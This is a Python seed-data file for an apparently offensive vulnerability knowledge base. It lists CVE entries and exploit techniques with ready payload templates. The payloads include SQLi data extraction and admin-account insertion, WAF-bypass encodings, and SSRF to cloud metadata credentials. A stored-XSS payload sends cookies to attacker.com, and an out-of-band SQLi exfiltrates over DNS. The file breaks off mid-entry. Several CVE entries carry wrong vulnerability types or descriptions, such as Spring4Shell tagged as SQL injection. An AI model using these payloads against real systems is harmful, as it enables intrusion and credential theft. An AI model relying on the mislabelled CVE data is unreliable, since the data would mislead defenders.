"""
Seed data loader for VulnKnowledgeBase.

Provides curated vulnerability intelligence covering OWASP Top 10 categories
with real, useful technique descriptions and payload patterns. Includes
Juice Shop-specific CVE entries. Also provides defense signature intelligence
for WAFs, EDRs, and application-level defenses.
"""

from __future__ import annotations

from typing import TYPE_CHECKING

import structlog

from hellcat.offensive.knowledge.vuln_db import (
    CveEntry,
    DefenseSignature,
    ExploitTechnique,
    TechSignature,
)

if TYPE_CHECKING:
    from hellcat.offensive.knowledge.vuln_db import VulnKnowledgeBase

logger = structlog.get_logger()


def seed_web_vulns(db: VulnKnowledgeBase) -> dict[str, int]:
    """
    Load curated web vulnerability intelligence into the knowledge base.

    Returns a dict with counts: {"cves": N, "techniques": N, "signatures": N}.
    """
    cve_count = db.ingest_cve_feed(_CVE_ENTRIES)
    tech_count = db.ingest_techniques(_EXPLOIT_TECHNIQUES)
    for sig in _TECH_SIGNATURES:
        db.ingest_tech_signature(sig)
    sig_count = len(_TECH_SIGNATURES)

    logger.info(
        "knowledge.seed_loaded",
        cves=cve_count,
        techniques=tech_count,
        signatures=sig_count,
    )
    return {"cves": cve_count, "techniques": tech_count, "signatures": sig_count}


# -----------------------------------------------------------------------
# CVE Entries
# -----------------------------------------------------------------------

_CVE_ENTRIES: list[CveEntry] = [
    # -- SQL Injection --
    CveEntry(
        cve_id="CVE-2021-32682",
        description="SQL injection in ElFinder file manager allows unauthenticated attackers to execute arbitrary SQL via crafted search parameters",
        cvss=9.8, vuln_type="sqli",
        affected_products=["elFinder"],
        published_date="2021-06-14",
    ),
    CveEntry(
        cve_id="CVE-2022-22965",
        description="Spring4Shell: RCE via data binding to Java class loader in Spring Framework allowing parameter injection to class.module.classLoader",
        cvss=9.8, vuln_type="sqli",
        affected_products=["Spring Framework", "Spring Boot"],
        published_date="2022-03-31",
    ),
    CveEntry(
        cve_id="CVE-2019-0232",
        description="Apache Tomcat CGI servlet command injection on Windows via enableCmdLineArguments parameter",
        cvss=8.1, vuln_type="sqli",
        affected_products=["Apache Tomcat"],
        published_date="2019-04-15",
    ),
    CveEntry(
        cve_id="CVE-2023-34362",
        description="MOVEit Transfer SQL injection allows unauthenticated access to database via crafted payload in HTTP header",
        cvss=9.8, vuln_type="sqli",
        affected_products=["MOVEit Transfer"],
        published_date="2023-06-01",
    ),
    CveEntry(
        cve_id="CVE-2020-17496",
        description="vBulletin subwidgetConfig unauthenticated SQL injection and remote code execution",
        cvss=9.8, vuln_type="sqli",
        affected_products=["vBulletin"],
        published_date="2020-08-10",
    ),

    # -- XSS --
    CveEntry(
        cve_id="CVE-2020-11022",
        description="jQuery before 3.5.0 is vulnerable to XSS via passing HTML from untrusted sources to jQuery DOM manipulation methods",
        cvss=6.1, vuln_type="xss",
        affected_products=["jQuery"],
        published_date="2020-04-29",
    ),
    CveEntry(
        cve_id="CVE-2021-41184",
        description="jQuery UI datepicker XSS via altField option accepting untrusted HTML",
        cvss=6.1, vuln_type="xss",
        affected_products=["jQuery UI"],
        published_date="2021-10-26",
    ),
    CveEntry(
        cve_id="CVE-2023-29489",
        description="cPanel reflected XSS via error pages allows script injection in cpaneld proxy subdomain",
        cvss=6.1, vuln_type="xss",
        affected_products=["cPanel"],
        published_date="2023-04-28",
    ),
    CveEntry(
        cve_id="CVE-2022-21703",
        description="Grafana stored XSS via data source plugin custom data allows admin account takeover",
        cvss=8.8, vuln_type="xss",
        affected_products=["Grafana"],
        published_date="2022-02-08",
    ),
    CveEntry(
        cve_id="CVE-2023-46747",
        description="F5 BIG-IP unauthenticated stored XSS in management interface leads to SSRF/RCE chain",
        cvss=9.8, vuln_type="xss",
        affected_products=["F5 BIG-IP"],
        published_date="2023-10-26",
    ),

    # -- SSRF --
    CveEntry(
        cve_id="CVE-2021-26855",
        description="Microsoft Exchange ProxyLogon SSRF allows unauthenticated attackers to access internal services and mailbox data",
        cvss=9.8, vuln_type="ssrf",
        affected_products=["Microsoft Exchange"],
        published_date="2021-03-02",
    ),
    CveEntry(
        cve_id="CVE-2019-17558",
        description="Apache Solr SSRF via Velocity template injection in Config API allows access to cloud metadata services",
        cvss=9.8, vuln_type="ssrf",
        affected_products=["Apache Solr"],
        published_date="2019-12-30",
    ),
    CveEntry(
        cve_id="CVE-2023-42793",
        description="JetBrains TeamCity authentication bypass via SSRF in agent protocol allows unauthenticated RCE",
        cvss=9.8, vuln_type="ssrf",
        affected_products=["JetBrains TeamCity"],
        published_date="2023-09-19",
    ),
    CveEntry(
        cve_id="CVE-2022-44877",
        description="CentOS Web Panel SSRF via cron job scheduling allows access to cloud instance metadata at 169.254.169.254",
        cvss=9.8, vuln_type="ssrf",
        affected_products=["CentOS Web Panel"],
        published_date="2022-12-05",
    ),

    # -- Auth Bypass --
    CveEntry(
        cve_id="CVE-2023-22515",
        description="Atlassian Confluence Data Center broken access control allows unauthenticated admin account creation",
        cvss=10.0, vuln_type="auth_bypass",
        affected_products=["Atlassian Confluence"],
        published_date="2023-10-04",
    ),
    CveEntry(
        cve_id="CVE-2021-22986",
        description="F5 BIG-IP iControl REST authentication bypass allows unauthenticated RCE via specially crafted requests",
        cvss=9.8, vuln_type="auth_bypass",
        affected_products=["F5 BIG-IP"],
        published_date="2021-03-31",
    ),
    CveEntry(
        cve_id="CVE-2022-40684",
        description="Fortinet FortiOS/FortiProxy authentication bypass via crafted HTTP request to admin REST API",
        cvss=9.8, vuln_type="auth_bypass",
        affected_products=["FortiOS", "FortiProxy"],
        published_date="2022-10-10",
    ),
    CveEntry(
        cve_id="CVE-2023-27997",
        description="Fortinet FortiGate SSL VPN heap buffer overflow pre-authentication leading to remote code execution",
        cvss=9.8, vuln_type="auth_bypass",
        affected_products=["FortiOS"],
        published_date="2023-06-11",
    ),

    # -- IDOR --
    CveEntry(
        cve_id="CVE-2023-23752",
        description="Joomla unauthorized API access via improper access check allows IDOR to retrieve database credentials",
        cvss=5.3, vuln_type="idor",
        affected_products=["Joomla"],
        published_date="2023-02-16",
    ),
    CveEntry(
        cve_id="CVE-2021-21311",
        description="Adminer redirect bypass allows IDOR access to other users' database sessions via predictable session IDs",
        cvss=7.2, vuln_type="idor",
        affected_products=["Adminer"],
        published_date="2021-02-11",
    ),

    # -- Path Traversal --
    CveEntry(
        cve_id="CVE-2021-41773",
        description="Apache HTTP Server 2.4.49 path traversal via URL-encoded dot-dot-slash allows reading arbitrary files",
        cvss=7.5, vuln_type="path_traversal",
        affected_products=["Apache HTTP Server"],
        published_date="2021-10-05",
    ),
    CveEntry(
        cve_id="CVE-2024-21762",
        description="Fortinet FortiOS out-of-bound write via path traversal in SSL VPN allows unauthenticated RCE",
        cvss=9.8, vuln_type="path_traversal",
        affected_products=["FortiOS"],
        published_date="2024-02-08",
    ),
    CveEntry(
        cve_id="CVE-2019-11510",
        description="Pulse Secure VPN arbitrary file reading via path traversal allows extraction of plaintext credentials",
        cvss=10.0, vuln_type="path_traversal",
        affected_products=["Pulse Secure VPN"],
        published_date="2019-04-24",
    ),

    # -- SSTI --
    CveEntry(
        cve_id="CVE-2022-22954",
        description="VMware Workspace ONE SSTI in the server-side template processing leads to unauthenticated RCE",
        cvss=9.8, vuln_type="ssti",
        affected_products=["VMware Workspace ONE"],
        published_date="2022-04-06",
    ),
    CveEntry(
        cve_id="CVE-2020-17530",
        description="Apache Struts2 forced OGNL evaluation via tag attributes allows SSTI to RCE",
        cvss=9.8, vuln_type="ssti",
        affected_products=["Apache Struts2"],
        published_date="2020-12-11",
    ),

    # -- Deserialization --
    CveEntry(
        cve_id="CVE-2015-4852",
        description="Oracle WebLogic Server Java deserialization via Apache Commons Collections allows unauthenticated RCE",
        cvss=9.8, vuln_type="deserialization",
        affected_products=["Oracle WebLogic"],
        published_date="2015-11-18",
    ),
    CveEntry(
        cve_id="CVE-2017-9805",
        description="Apache Struts2 REST plugin XStream deserialization leads to remote code execution",
        cvss=8.1, vuln_type="deserialization",
        affected_products=["Apache Struts2"],
        published_date="2017-09-15",
    ),
    CveEntry(
        cve_id="CVE-2021-21972",
        description="VMware vCenter Server RCE via unrestricted file upload in vSphere client plugin",
        cvss=9.8, vuln_type="deserialization",
        affected_products=["VMware vCenter"],
        published_date="2021-02-23",
    ),

    # -- Command Injection --
    CveEntry(
        cve_id="CVE-2021-44228",
        description="Log4Shell: Apache Log4j2 JNDI injection via crafted log message allows unauthenticated RCE on Java applications",
        cvss=10.0, vuln_type="command_injection",
        affected_products=["Apache Log4j2"],
        published_date="2021-12-10",
    ),
    CveEntry(
        cve_id="CVE-2022-27925",
        description="Zimbra Collaboration Suite arbitrary file upload to RCE via mboximport command injection",
        cvss=7.2, vuln_type="command_injection",
        affected_products=["Zimbra"],
        published_date="2022-04-20",
    ),

    # -- XXE --
    CveEntry(
        cve_id="CVE-2018-11776",
        description="Apache Struts2 namespace OGNL injection via XML configuration allows XXE to RCE chain",
        cvss=8.1, vuln_type="xxe",
        affected_products=["Apache Struts2"],
        published_date="2018-08-22",
    ),

    # -- Juice Shop specific --
    CveEntry(
        cve_id="JUICE-001",
        description="OWASP Juice Shop DOM XSS in search field via URL hash fragment allows script injection without server interaction",
        cvss=6.1, vuln_type="xss",
        affected_products=["OWASP Juice Shop"],
        published_date="2024-01-01",
    ),
    CveEntry(
        cve_id="JUICE-002",
        description="OWASP Juice Shop SQL injection in login form allows authentication bypass via OR-based boolean injection",
        cvss=9.8, vuln_type="sqli",
        affected_products=["OWASP Juice Shop"],
        published_date="2024-01-01",
    ),
    CveEntry(
        cve_id="JUICE-003",
        description="OWASP Juice Shop broken access control allows horizontal privilege escalation via basket ID manipulation",
        cvss=7.5, vuln_type="idor",
        affected_products=["OWASP Juice Shop"],
        published_date="2024-01-01",
    ),
    CveEntry(
        cve_id="JUICE-004",
        description="OWASP Juice Shop forged JWT tokens accepted due to none algorithm acceptance in jsonwebtoken library",
        cvss=8.8, vuln_type="auth_bypass",
        affected_products=["OWASP Juice Shop"],
        published_date="2024-01-01",
    ),
    CveEntry(
        cve_id="JUICE-005",
        description="OWASP Juice Shop path traversal in file serving endpoint allows reading /etc/passwd and application source",
        cvss=7.5, vuln_type="path_traversal",
        affected_products=["OWASP Juice Shop"],
        published_date="2024-01-01",
    ),
]

# -----------------------------------------------------------------------
# Exploit Techniques
# -----------------------------------------------------------------------

_EXPLOIT_TECHNIQUES: list[ExploitTechnique] = [
    # ============== SQL Injection ==============
    ExploitTechnique(
        technique_id="sqli-union-basic",
        vuln_type="sqli",
        name="UNION-based column enumeration",
        description="Determine column count with ORDER BY or UNION SELECT NULL incrementally, then extract data by replacing NULLs with column names from information_schema.columns",
        payload_template="' UNION SELECT NULL,NULL,table_name FROM information_schema.tables--",
        context="Works best on MySQL/MariaDB and PostgreSQL. Requires visible output in HTTP response.",
        success_rate=0.7,
        source="OWASP Testing Guide",
        tags=["sqli", "union", "data_extraction"],
    ),
    ExploitTechnique(
        technique_id="sqli-union-string-concat",
        vuln_type="sqli",
        name="UNION with string concatenation",
        description="Use database-specific concat functions to extract multiple columns in a single UNION column. MySQL: CONCAT(), PostgreSQL: ||, MSSQL: +",
        payload_template="' UNION SELECT NULL,CONCAT(username,':',password) FROM users--",
        context="Useful when UNION column count is limited. Adjust concat function per DB engine.",
        success_rate=0.65,
        source="PortSwigger Web Security Academy",
        tags=["sqli", "union", "concat", "data_extraction"],
    ),
    ExploitTechnique(
        technique_id="sqli-boolean-blind",
        vuln_type="sqli",
        name="Boolean-based blind SQLi",
        description="Infer data one bit at a time by observing differential responses. Use SUBSTRING and ASCII to extract characters. Automate with binary search for efficiency.",
        payload_template="' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",
        context="Works when UNION is blocked but boolean logic changes response. Slow but reliable.",
        success_rate=0.6,
        source="OWASP Testing Guide",
        tags=["sqli", "blind", "boolean"],
    ),
    ExploitTechnique(
        technique_id="sqli-time-blind",
        vuln_type="sqli",
        name="Time-based blind SQLi",
        description="Use conditional time delays to infer boolean conditions. MySQL: SLEEP(), PostgreSQL: pg_sleep(), MSSQL: WAITFOR DELAY. Binary search on ASCII values.",
        payload_template="' AND IF(1=1,SLEEP(5),0)--",
        context="Last resort when no visible output difference. Very slow but works through WAFs.",
        success_rate=0.5,
        source="SQLMap techniques",
        tags=["sqli", "blind", "time"],
    ),
    ExploitTechnique(
        technique_id="sqli-error-based",
        vuln_type="sqli",
        name="Error-based SQLi data extraction",
        description="Force database errors that include query results in error messages. MySQL: extractvalue/updatexml, PostgreSQL: CAST errors, MSSQL: convert errors.",
        payload_template="' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--",
        context="Requires verbose error messages in response. Fast single-query extraction.",
        success_rate=0.55,
        source="PortSwigger Web Security Academy",
        tags=["sqli", "error", "data_extraction"],
    ),
    ExploitTechnique(
        technique_id="sqli-stacked-queries",
        vuln_type="sqli",
        name="Stacked queries for write operations",
        description="Execute multiple SQL statements separated by semicolons. Enables INSERT/UPDATE/DELETE. Not supported on all drivers (works with PHP/MSSQL, Python/PostgreSQL).",
        payload_template="'; INSERT INTO users(username,password,role) VALUES('pwned','hash','admin')--",
        context="Requires multi-statement support in DB driver. Can create admin accounts.",
        success_rate=0.35,
        source="OWASP Testing Guide",
        tags=["sqli", "stacked", "write"],
    ),
    ExploitTechnique(
        technique_id="sqli-auth-bypass",
        vuln_type="sqli",
        name="Authentication bypass via login form SQLi",
        description="Classic OR-based injection in login forms to bypass authentication. Targets WHERE clauses in credential verification queries.",
        payload_template="' OR 1=1--",
        context="Works on forms using string concatenation for queries. Try variations: admin'-- , ' OR ''=' , ' OR 1=1#",
        success_rate=0.75,
        source="OWASP Top 10",
        tags=["sqli", "auth_bypass", "login"],
    ),
    ExploitTechnique(
        technique_id="sqli-waf-bypass-encoding",
        vuln_type="sqli",
        name="WAF bypass via double URL encoding",
        description="Evade WAF rules by double-encoding SQL keywords. %252F = /, %2527 = ', %2553%2545%254C%2545%2543%2554 = SELECT. Also try Unicode overlong encoding.",
        payload_template="%2527%2520UNION%2520SELECT%2520NULL%252CNULL%252Ctable_name%2520FROM%2520information_schema.tables--",
        context="Effective against WAFs that decode URL once before matching rules.",
        success_rate=0.4,
        source="WAF bypass research",
        tags=["sqli", "waf_bypass", "encoding"],
    ),
    ExploitTechnique(
        technique_id="sqli-waf-bypass-comments",
        vuln_type="sqli",
        name="WAF bypass via inline comments",
        description="Break up SQL keywords with inline comments: SEL/**/ECT, UN/**/ION. MySQL also supports /*! versioned comments */ for conditional execution.",
        payload_template="' UN/**/ION SEL/**/ECT NULL,username,password FR/**/OM users--",
        context="Bypasses simple regex-based WAF rules. Combine with case alternation: SeLeCt.",
        success_rate=0.45,
        source="WAF bypass research",
        tags=["sqli", "waf_bypass", "comments"],
    ),
    ExploitTechnique(
        technique_id="sqli-out-of-band",
        vuln_type="sqli",
        name="Out-of-band SQLi via DNS/HTTP exfiltration",
        description="Exfiltrate data through DNS or HTTP requests initiated by the DB. MySQL: LOAD_FILE to UNC path, MSSQL: xp_dirtree, Oracle: UTL_HTTP. Requires network egress.",
        payload_template="'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\a'))--",
        context="Useful when no in-band response channel. Requires DNS/HTTP callback server.",
        success_rate=0.3,
        source="PortSwigger Web Security Academy",
        tags=["sqli", "oob", "dns", "exfiltration"],
    ),
    ExploitTechnique(
        technique_id="sqli-nosql-injection",
        vuln_type="sqli",
        name="NoSQL injection via JSON operator abuse",
        description="Inject MongoDB operators through JSON parameters: {$gt:''}, {$ne:null}, {$regex:'.*'}. Bypass authentication or extract data via regex enumeration.",
        payload_template='{"username":{"$gt":""},"password":{"$gt":""}}',
        context="Targets MongoDB/Mongoose applications accepting JSON input. Test both body and query params.",
        success_rate=0.6,
        source="OWASP NoSQL Injection",
        tags=["sqli", "nosql", "mongodb"],
    ),

    # ============== XSS ==============
    ExploitTechnique(
        technique_id="xss-reflected-basic",
        vuln_type="xss",
        name="Basic reflected XSS via script tag",
        description="Inject a script tag into a reflected parameter that's rendered without encoding. Test with alert/confirm/prompt, then escalate to cookie theft or keylogging.",
        payload_template='<script>alert(document.domain)</script>',
        context="Works when input is reflected in HTML body without entity encoding.",
        success_rate=0.5,
        source="OWASP Testing Guide",
        tags=["xss", "reflected", "script"],
    ),
    ExploitTechnique(
        technique_id="xss-dom-hash",
        vuln_type="xss",
        name="DOM XSS via URL hash fragment",
        description="Inject through URL hash (location.hash) which is processed client-side by JavaScript. Never sent to server, bypasses server-side WAFs entirely.",
        payload_template='#<img src=x onerror=alert(1)>',
        context="Look for document.location.hash being used in innerHTML, eval, or jQuery selectors.",
        success_rate=0.6,
        source="PortSwigger Web Security Academy",
        tags=["xss", "dom", "hash"],
    ),
    ExploitTechnique(
        technique_id="xss-stored-comment",
        vuln_type="xss",
        name="Stored XSS via user-generated content",
        description="Inject persistent XSS through comment fields, profile names, or any stored user input rendered to other users. Higher impact than reflected XSS.",
        payload_template='<img src=x onerror="fetch(\'https://attacker.com/steal?c=\'+document.cookie)">',
        context="Target fields rendered to multiple users. Look for profile names, comments, forum posts.",
        success_rate=0.45,
        source="OWASP Testing Guide",
        tags=["xss", "stored", "cookie_theft"],
    ),
    ExploitTechnique(
        technique_id="xss-event-handler",
        vuln_type="xss",
        name="XSS via HTML event handlers",
        description="When script tags are filtered, use event handlers: onload, onerror, onfocus, onmouseover. Combine with autofocus or tabindex for auto-triggering.",
        payload_template='<input autofocus onfocus=alert(1)>',
        context="Bypasses filters that block <script> but allow other HTML. Try: <svg onload=...>, <body onload=...>, <details open ontoggle=...>",
        success_rate=0.55,
        source="PortSwigger XSS cheat sheet",
        tags=["xss", "event_handler", "filter_bypass"],
    ),
    ExploitTechnique(
        technique_id="xss-svg-injection",
        vuln_type="xss",
        name="XSS via SVG element injection",
        description="Use SVG elements which support onload and other event handlers. SVGs are often allowed by sanitizers that block regular HTML tags.",
        payload_template='<svg/onload=alert(1)>',
        context="Effective against DOMPurify with default config, Angular bypassSecurityTrust. Also try: <svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        success_rate=0.5,
        source="PortSwigger XSS cheat sheet",
        tags=["xss", "svg", "filter_bypass"],
    ),
    ExploitTechnique(
        technique_id="xss-template-injection",
        vuln_type="xss",
        name="Client-side template injection XSS",
        description="Inject into Angular/Vue/React template expressions. Angular: {{constructor.constructor('return this')().alert(1)}}, Vue: {{_c.constructor('alert(1)')()}}",
        payload_template='{{constructor.constructor("return this")().alert(1)}}',
        context="Targets applications using client-side templating. Check for {{ }} processing in page source.",
        success_rate=0.4,
        source="PortSwigger research",
        tags=["xss", "template", "angular", "csti"],
    ),
    ExploitTechnique(
        technique_id="xss-csp-bypass-jsonp",
        vuln_type="xss",
        name="CSP bypass via JSONP endpoint",
        description="When CSP allows a domain that has a JSONP endpoint, use it as a script source to execute arbitrary JS. Find JSONP on allowed CDN domains.",
        payload_template='<script src="//allowed-cdn.com/jsonp?callback=alert"></script>',
        context="Check CSP header for whitelisted domains. Search for JSONP/callback parameters on those domains.",
        success_rate=0.35,
        source="CSP bypass techniques",
        tags=["xss", "csp_bypass", "jsonp"],
    ),
    ExploitTechnique(
        technique_id="xss-waf-bypass-encoding",
        vuln_type="xss",
        name="XSS WAF bypass via HTML entity encoding",
        description="Use HTML entities, hex encoding, or JavaScript unicode escapes to bypass WAF pattern matching. &#x61;lert(1), \\u0061lert(1), eval(atob('base64')).",
        payload_template='<img src=x onerror="&#x65;val(atob(\'YWxlcnQoMSk=\'))">',
        context="Combine multiple encoding layers. Try: String.fromCharCode(), eval with template literals.",
        success_rate=0.4,
        source="WAF bypass research",
        tags=["xss", "waf_bypass", "encoding"],
    ),

    # ============== SSRF ==============
    ExploitTechnique(
        technique_id="ssrf-basic-localhost",
        vuln_type="ssrf",
        name="Basic SSRF to localhost services",
        description="Redirect URL-fetching features to localhost to access internal services (admin panels, databases, cloud metadata). Test http://127.0.0.1, http://localhost, http://[::1].",
        payload_template="http://127.0.0.1:80/admin",
        context="Look for URL parameters, webhook configs, image import features, PDF generators.",
        success_rate=0.6,
        source="OWASP Testing Guide",
        tags=["ssrf", "localhost", "internal"],
    ),
    ExploitTechnique(
        technique_id="ssrf-cloud-metadata",
        vuln_type="ssrf",
        name="Cloud metadata service access via SSRF",
        description="Access cloud instance metadata to retrieve IAM credentials, instance identity, and user data. AWS: 169.254.169.254, GCP: metadata.google.internal, Azure: 169.254.169.254.",
        payload_template="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        context="Critical impact on cloud-hosted applications. IMDSv2 requires PUT with token header. Try redirect bypass.",
        success_rate=0.55,
        source="Cloud security research",
        tags=["ssrf", "cloud", "metadata", "aws", "iam"],
    ),
    ExploitTechnique(
        technique_id="ssrf-dns-rebinding",
        vuln_type="ssrf",
        name="DNS rebinding to bypass SSRF filters",
        description="Use a DNS name that first resolves to an allowed IP, then rebinds to 127.0.0.1 after the allowlist check. Use services like rebind.it or custom DNS servers.",
        payload_template="http://A.127.0.0.1.1time.169.254.169.254.1time.repeat.rebind.it/",
        context="Bypasses IP-based SSRF filters that resolve DNS before making the request.",
        success_rate=0.35,
        source="SSRF research",
        tags=["ssrf", "dns_rebinding", "filter_bypass"],
    ),
    ExploitTechnique(
        technique_id="ssrf-redirect-bypass",
        vuln_type="ssrf",
        name="SSRF filter bypass via HTTP redirect",
        description="Host a redirect on an external server pointing to the internal target. Application validates the initial URL but follows the redirect to 127.0.0.1.",
        payload_template="https://attacker.com/redirect?url=http://169.254.169.254/",
        context="Works when application validates URL before request but follows redirects. Also try URL shorteners.",
        success_rate=0.45,
        source="PortSwigger Web Security Academy",
        tags=["ssrf", "redirect", "filter_bypass"],
    ),
    ExploitTechnique(
        technique_id="ssrf-gopher-protocol",
        vuln_type="ssrf",
        name="SSRF to internal services via gopher protocol",
        description="Use gopher:// protocol to send arbitrary TCP data to internal services (Redis, memcached, SMTP). Construct raw protocol payloads URL-encoded in gopher URL.",
        payload_template="gopher://127.0.0.1:6379/_SET%20pwned%20true%0D%0A",
        context="Requires application to support gopher:// protocol. Works with curl, PHP, Java URL class.",
        success_rate=0.3,
        source="SSRF exploitation research",
        tags=["ssrf", "gopher", "internal_services"],
    ),
    ExploitTechnique(
        technique_id="ssrf-ip-bypass-formats",
        vuln_type="ssrf",
        name="SSRF IP filter bypass via alternative formats",
        description="Use alternative IP representations to bypass blocklist: decimal (2130706433), hex (0x7f000001), octal (0177.0.0.1), IPv6-mapped (::ffff:127.0.0.1), zero shorthand (0.0.0.0).",
        payload_template="http://2130706433/admin",
        context="Bypasses naive IP comparison filters. Try: http://0x7f.0x0.0x0.0x1, http://017700000001, http://127.1",
        success_rate=0.5,
        source="SSRF filter bypass techniques",
        tags=["ssrf", "ip_bypass", "filter_bypass"],
    ),

    # ============== Auth Bypass ==============
    ExploitTechnique(
        technique_id="auth-jwt-none-alg",
        vuln_type="auth_bypass",
        name="JWT none algorithm bypass",
        description="Modify JWT header to use 'none' algorithm, strip the signature. Some libraries accept tokens with alg:none if not explicitly rejected.",
        payload_template='{"alg":"none","typ":"JWT"}.{"sub":"admin","iat":1234567890}..',
        context="Decode JWT, change alg to 'none', re-encode header.payload with empty signature. Try: None, NONE, nOnE.",
        success_rate=0.4,
        source="JWT security research",
        tags=["auth_bypass", "jwt", "none_algorithm"],
    ),
    ExploitTechnique(
        technique_id="auth-jwt-key-confusion",
        vuln_type="auth_bypass",
        name="JWT algorithm confusion (RS256 to HS256)",
        description="Change algorithm from RS256 to HS256 and sign with the public key as HMAC secret. If server uses the same key object for verification, the signature validates.",
        payload_template="Change header alg RS256->HS256, sign payload with server's RSA public key as HMAC secret",
        context="Requires obtaining the server's RSA public key (often exposed at /jwks.json or /.well-known/).",
        success_rate=0.3,
        source="PortSwigger JWT attacks",
        tags=["auth_bypass", "jwt", "algorithm_confusion"],
    ),
    ExploitTechnique(
        technique_id="auth-default-creds",
        vuln_type="auth_bypass",
        name="Default credential testing",
        description="Test common default credentials for admin panels: admin/admin, admin/password, root/toor, administrator/administrator. Check vendor documentation for defaults.",
        payload_template="admin:admin, admin:password, root:root, test:test, admin:admin123",
        context="Always test defaults before brute force. Check SecLists/Passwords/Default-Credentials.",
        success_rate=0.25,
        source="OWASP Testing Guide",
        tags=["auth_bypass", "default_credentials"],
    ),
    ExploitTechnique(
        technique_id="auth-forced-browsing",
        vuln_type="auth_bypass",
        name="Forced browsing to unprotected endpoints",
        description="Directly access administrative or sensitive endpoints that lack authentication checks. Common: /admin, /api/users, /debug, /actuator, /swagger-ui, /graphql.",
        payload_template="/admin /api/v1/users /actuator/env /debug/pprof /graphql",
        context="Enumerate paths with wordlists. Check for different HTTP methods (PUT/DELETE may bypass auth).",
        success_rate=0.5,
        source="OWASP Testing Guide",
        tags=["auth_bypass", "forced_browsing", "access_control"],
    ),
    ExploitTechnique(
        technique_id="auth-session-fixation",
        vuln_type="auth_bypass",
        name="Session fixation attack",
        description="Set a known session ID before authentication, then wait for victim to log in with that session. If the session is not regenerated after login, attacker gains access.",
        payload_template="Set-Cookie: JSESSIONID=attacker_controlled_value; Path=/",
        context="Test by setting session cookie before login, then check if same session persists after authentication.",
        success_rate=0.3,
        source="OWASP Session Management",
        tags=["auth_bypass", "session", "fixation"],
    ),

    # ============== IDOR ==============
    ExploitTechnique(
        technique_id="idor-numeric-id",
        vuln_type="idor",
        name="IDOR via sequential numeric ID enumeration",
        description="Replace numeric IDs in API paths or parameters with other users' IDs. Test /api/users/1, /api/users/2 to access other users' data.",
        payload_template="/api/users/{other_user_id}/profile",
        context="Capture legitimate request, increment/decrement IDs. Check both GET and modification endpoints.",
        success_rate=0.65,
        source="OWASP Testing Guide",
        tags=["idor", "enumeration", "api"],
    ),
    ExploitTechnique(
        technique_id="idor-uuid-leak",
        vuln_type="idor",
        name="IDOR via leaked UUID in responses",
        description="Even with UUIDs, look for ID leaks in HTML source, API responses, WebSocket messages, or predictable UUID generation (v1 UUIDs contain timestamp+MAC).",
        payload_template="Check API responses for other users' UUIDs in list endpoints, then use in direct access",
        context="Search for UUIDs in: paginated lists, search results, autocomplete, GraphQL introspection.",
        success_rate=0.5,
        source="API security research",
        tags=["idor", "uuid", "information_disclosure"],
    ),
    ExploitTechnique(
        technique_id="idor-param-pollution",
        vuln_type="idor",
        name="IDOR via HTTP parameter pollution",
        description="Send duplicate parameters with different values: ?user_id=1&user_id=2. Different frameworks handle duplicates differently, potentially bypassing auth checks.",
        payload_template="?user_id=myid&user_id=target_id",
        context="Some frameworks use first value for auth check but last value for data retrieval (or vice versa).",
        success_rate=0.35,
        source="Parameter pollution research",
        tags=["idor", "parameter_pollution", "hpp"],
    ),
    ExploitTechnique(
        technique_id="idor-method-override",
        vuln_type="idor",
        name="IDOR via HTTP method override",
        description="Use X-HTTP-Method-Override or _method parameter to change the effective HTTP method. GET requests may bypass authorization that only protects POST/PUT/DELETE.",
        payload_template="GET /api/admin/users HTTP/1.1\nX-HTTP-Method-Override: DELETE",
        context="Try headers: X-HTTP-Method-Override, X-Method-Override, X-HTTP-Method. Also try _method query param.",
        success_rate=0.3,
        source="API security testing",
        tags=["idor", "method_override", "access_control"],
    ),

    # ============== Path Traversal ==============
    ExploitTechnique(
        technique_id="path-traversal-basic",
        vuln_type="path_traversal",
        name="Basic directory traversal via dot-dot-slash",
        description="Navigate up the filesystem using ../ sequences to read sensitive files: /etc/passwd, /etc/shadow, application configuration files, source code.",
        payload_template="../../../../../../etc/passwd",
        context="Test in file download, image load, template include, and log file parameters.",
        success_rate=0.55,
        source="OWASP Testing Guide",
        tags=["path_traversal", "lfi", "file_read"],
    ),
    ExploitTechnique(
        technique_id="path-traversal-encoded",
        vuln_type="path_traversal",
        name="Path traversal via URL encoding bypass",
        description="Bypass filters using: %2e%2e%2f, %252e%252e%252f (double encode), ..%c0%af (overlong UTF-8), ..%ef%bc%8f (Unicode slash).",
        payload_template="..%252f..%252f..%252f..%252fetc%252fpasswd",
        context="Try multiple encoding layers. Apache 2.4.49 was vulnerable to %2e path normalization bypass.",
        success_rate=0.45,
        source="CVE-2021-41773 research",
        tags=["path_traversal", "encoding", "filter_bypass"],
    ),
    ExploitTechnique(
        technique_id="path-traversal-null-byte",
        vuln_type="path_traversal",
        name="Path traversal with null byte truncation",
        description="Append %00 to truncate file extension checks: ../../etc/passwd%00.jpg. Works on older PHP (< 5.3.4) and some Java implementations.",
        payload_template="../../../../../../etc/passwd%00.png",
        context="Legacy technique but still works on some systems. Also try: filename%00.allowed_ext.",
        success_rate=0.25,
        source="OWASP Testing Guide",
        tags=["path_traversal", "null_byte", "truncation"],
    ),
    ExploitTechnique(
        technique_id="path-traversal-absolute",
        vuln_type="path_traversal",
        name="Absolute path injection",
        description="Instead of relative traversal, try injecting an absolute path directly: /etc/passwd, C:\\windows\\win.ini. Some applications prepend a base path but don't validate.",
        payload_template="/etc/passwd",
        context="If relative traversal is filtered, try absolute paths. On Windows try C:/windows/system.ini.",
        success_rate=0.4,
        source="OWASP Testing Guide",
        tags=["path_traversal", "absolute", "file_read"],
    ),

    # ============== SSTI ==============
    ExploitTechnique(
        technique_id="ssti-detect-polyglot",
        vuln_type="ssti",
        name="SSTI detection via polyglot probe",
        description="Detect template engines by injecting mathematical expressions: {{7*7}}=49 (Jinja2/Twig), ${7*7}=49 (Freemarker/Velocity), #{7*7}=49 (Ruby ERB). Different syntax for different engines.",
        payload_template="{{7*7}} ${7*7} #{7*7} <%=7*7%>",
        context="If any probe returns 49, the template engine is executing. Identify the engine from syntax.",
        success_rate=0.7,
        source="PortSwigger SSTI research",
        tags=["ssti", "detection", "polyglot"],
    ),
    ExploitTechnique(
        technique_id="ssti-jinja2-rce",
        vuln_type="ssti",
        name="Jinja2 SSTI to RCE via MRO traversal",
